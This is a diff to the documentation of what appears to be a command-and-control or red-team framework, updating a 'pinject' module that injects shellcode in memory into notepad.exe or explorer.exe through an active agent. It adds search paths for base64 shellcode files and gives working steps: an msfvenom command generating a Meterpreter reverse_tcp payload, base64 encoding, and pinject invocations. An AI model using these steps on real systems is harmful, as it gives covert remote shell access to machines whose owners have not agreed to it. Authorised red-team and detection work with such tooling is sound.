@@ -59,6 +59,10 @@ Each operator maintains their own local extension modules:
 - **Search Directories**: `modules/external/powershell/`, `modules/external/`
 - **File Extensions**: `.ps1`, `.psm1`, `.psd1`
 
+#### Shellcode PInject
+- **Search Directories**: `modules/external/`, `modules/external/shellcode/`
+- **File Extensions**: `.b64`,
+
 ### Security and Isolation Benefits
 
 #### Operational Security
@@ -188,20 +192,24 @@ This module interfaces with an active agent for In-memory shellcode injection in
 
 #### Usage
 1. Generate compatible shellcode using msfvenom
-2. Use the module with a base64 encoded shellcode string
+2. Run the module and send shellcode as a base64 encoded string or a .b64 file
 3. The agent will in-memory inject the shellcode into either notepad.exe or explorer.exe
 
 #### msfvenom Command Syntax
 Generate shellcode with proper null byte avoidance and correct format:
 
 ```
-# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode.bin
-# Then base64 encode it before sending to the module
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode.bin
 
+# Base64 encode it before sending to the module
 base64 -w 0 shellcode.bin
+pinject <base64_shellcode>
+# Example:
+pinject 123ABCD==
 
-pinject <shellcode> # METHOD - 1 (Interactive mode)
-run pinject <shellcode> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode)
+# Base64 encode it and save to file before sending to the module
+base64 -w 0 shellcode.bin > shellcode.b64
+pinject shellcode.b64
 ```
 
 #### Notes
